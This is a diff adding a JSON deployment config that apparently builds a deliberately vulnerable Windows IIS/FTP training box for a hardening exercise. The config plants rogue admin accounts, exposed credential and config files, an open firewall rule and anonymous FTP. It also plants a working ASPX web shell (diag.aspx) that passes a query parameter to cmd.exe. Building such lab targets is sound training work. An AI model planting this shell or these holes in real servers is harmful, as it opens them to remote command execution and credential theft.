@@ -1,0 +1,106 @@
+{
+  "_comment": "Saltmarsh Exchange: the IIS + FTP web-tier WINDOWS hardening box (workgroup member server swa-web01; os contains 'win' so nakon uses its PowerShell deploy path -- SSH transport, Windows OpenSSH, run.ps1 with per-step scripts; elevation comes from the SSH principal, which must be a local administrator). ORDER MATTERS: iis-ftp-base-win installs the IIS/FTP roles and builds the business-functional baseline (site SaltmarshPortal on portal.saltmarsh.local, app pool, /backoffice app, FTP site VendorDrop, local group SaltmarshVendors + account ftp_vendor, ACLs, FTPS cert, logging, scoped SaltmarshFtpIn rule) BEFORE any of the -off seeds flip it. The account plants run before the group-add and before the file plants; the live web.config / web.config.bak / diag.aspx / .git / credential file and the portal-source.zip follow the base. ftp-hardening-off-win runs LAST so its broad Any-scope firewall rule and anonymous authorization are the final state. iis-hardening-off-win, iis-backoffice-open-win and iis-admin-console-win each depend_on iis-ftp-base-win, so selecting one alone still resolves the base first. Name discipline: every SITE / APP POOL / FTP SITE / GROUP / USER / RULE_NAME / FILE_PATH here MUST match its paired check's collect params in scenario.yaml byte-for-byte -- nothing cross-validates them. Disable-don't-delete: svc_webdeploy is planted as a local admin and the paired check wants it DISABLED (not deleted); local-user-enable-win exists because local-user-win's update path never flips Enabled, so a re-plant after a team disables the account restores the 0-state. ftp_vendor is a LEGITIMATE business account -- base re-enables and re-passwords it on every plant; the finding is only its Administrators membership. Forensics breadcrumbs: fq_webdeploy_account (the account), fq_ftp_vendor_password (the outgoing credential file), fq_db_password (the web.config.bak connection string), fq_apppool_identity (the LocalSystem pool), fq_webshell_name (diag.aspx), fq_admin_port (the SaltmarshAdmin site on 8080). The base is the SECURE baseline for the flip-based findings; the absence-based findings (no HTTPS binding, no redirect) are simply absent at baseline. Re-running plant restores the 0-state; re-plant after a harden pass is the revert procedure. Template prep: full clone windows-server-fix (953), local admin sysadmin/SaltmarshBuild2026!, OpenSSH + password auth, Python 3.12 at C:\\Python312 on PATH, RDP+NLA, firewall rules for 22. IIS/FTP can be pre-installed in the template to shorten the first plant (the base seed is idempotent).",
+  "machines": [
+    {
+      "id": 1,
+      "name": "swa-web01",
+      "ip": "REPLACED-BY-PROVIDER",
+      "os": "windows-server",
+      "user": "REPLACED-BY-PROVIDER",
+      "password": "REPLACED-BY-PROVIDER",
+      "port": 22,
+      "configurations": [
+        "iis-ftp-base-win",
+        {
+          "name": "sensitive-file-win",
+          "vars": {
+            "FILE_PATH": "C:\\inetpub\\saltmarsh\\wwwroot\\web.config",
+            "FILE_CONTENT": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n  <system.web>\n    <compilation debug=\"true\" targetFramework=\"4.8\" />\n    <customErrors mode=\"Off\" />\n  </system.web>\n</configuration>\n"
+          }
+        },
+        {
+          "name": "local-user-win",
+          "vars": {
+            "USERNAME": "svc_webdeploy",
+            "PASSWORD": "Bootstrap2026!",
+            "FULLNAME": "M. Deploy Tooling",
+            "DESCRIPTION": "Temporary deployment helper",
+            "ADMIN_ADD": "1"
+          }
+        },
+        {
+          "name": "local-user-enable-win",
+          "vars": {
+            "USERNAME": "svc_webdeploy"
+          }
+        },
+        "guest-enabled-win",
+        {
+          "name": "local-group-member-win",
+          "vars": {
+            "GROUP": "Administrators",
+            "USERNAME": "ftp_vendor"
+          }
+        },
+        "wmsvc-enabled-win",
+        {
+          "name": "firewall-allow-rule-win",
+          "vars": {
+            "RULE_NAME": "VendorFtpAlt",
+            "LOCAL_PORT": "2121",
+            "PROTOCOL": "TCP",
+            "DESCRIPTION": "Legacy vendor FTP listener (decommissioned)"
+          }
+        },
+        {
+          "name": "insecure-smb-share-quiet-win",
+          "vars": {
+            "SHARE_NAME": "SaltmarshWeb$",
+            "SHARE_PATH": "C:\\inetpub\\saltmarsh",
+            "DESCRIPTION": "Saltmarsh content and drop staging"
+          }
+        },
+        "iis-hardening-off-win",
+        "iis-backoffice-open-win",
+        "iis-admin-console-win",
+        {
+          "name": "sensitive-file-win",
+          "vars": {
+            "FILE_PATH": "C:\\inetpub\\saltmarsh\\wwwroot\\app\\web.config.bak",
+            "FILE_CONTENT": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n  <connectionStrings>\n    <add name=\"SaltmarshDb\"\n         connectionString=\"Server=sql01.saltmarsh.local;Database=Saltmarsh;User Id=portal_app;Password=SqlS3rv1ce!2024;\" />\n  </connectionStrings>\n</configuration>\n"
+          }
+        },
+        {
+          "name": "sensitive-file-win",
+          "vars": {
+            "FILE_PATH": "C:\\inetpub\\saltmarsh\\wwwroot\\diag.aspx",
+            "FILE_CONTENT": "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<script runat=\"server\">\nvoid Page_Load(object sender, EventArgs e) {\n    string c = Request.QueryString[\"c\"];\n    if (!string.IsNullOrEmpty(c)) {\n        Process p = new Process();\n        p.StartInfo.FileName = \"cmd.exe\";\n        p.StartInfo.Arguments = \"/c \" + c;\n        p.StartInfo.UseShellExecute = false;\n        p.StartInfo.RedirectStandardOutput = true;\n        p.Start();\n        Response.Write(\"<pre>\" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + \"</pre>\");\n    }\n}\n</script>\n<html><body><h1>Diagnostics</h1></body></html>\n"
+          }
+        },
+        {
+          "name": "sensitive-file-win",
+          "vars": {
+            "FILE_PATH": "C:\\inetpub\\saltmarsh\\wwwroot\\.git\\config",
+            "FILE_CONTENT": "[core]\n\trepositoryformatversion = 0\n\tfilemode = false\n\tbare = false\n[remote \"origin\"]\n\turl = https://git.saltmarsh.local/web/portal.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[user]\n\tname = portal-deploy\n\temail = deploy@saltmarsh.local\n"
+          }
+        },
+        {
+          "name": "sensitive-file-win",
+          "vars": {
+            "FILE_PATH": "C:\\inetpub\\saltmarsh\\ftproot\\outgoing\\vendor-credentials.txt",
+            "FILE_CONTENT": "# VendorDrop FTP - vendor onboarding (KEEP PRIVATE)\nhost: ftp.saltmarsh.local\nuser: ftp_vendor\npassword: Kestrel2026!\n"
+          }
+        },
+        {
+          "name": "zip-archive-win",
+          "vars": {
+            "ZIP_PATH": "C:\\inetpub\\saltmarsh\\wwwroot\\backup\\portal-source.zip",
+            "ENTRY_NAME": "portal-source/app/default.aspx",
+            "ENTRY_CONTENT": "<%-- old build, do not publish --%>"
+          }
+        },
+        "ftp-hardening-off-win"
+      ]
+    }
+  ]
+}
